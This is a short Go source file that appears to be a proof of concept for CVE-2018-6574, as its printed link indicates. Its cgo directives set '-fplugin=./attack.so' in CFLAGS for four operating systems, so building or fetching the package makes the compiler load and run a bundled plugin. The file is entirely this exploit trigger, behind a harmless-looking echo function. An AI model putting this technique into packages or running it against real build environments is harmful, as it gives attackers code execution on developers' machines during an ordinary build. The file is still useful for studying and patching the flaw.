package main

/*
#cgo linux CFLAGS: -fplugin=./attack.so
#cgo freebsd CFLAGS: -fplugin=./attack.so
#cgo darwin CFLAGS: -fplugin=./attack.so
#cgo windows CFLAGS: -fplugin=./attack.so
void echo() {
  printf("link: https://github.com/neargle/CVE-2018-6574-POC");
}
*/
import "C"

func main() {
	C.echo()
	return
}
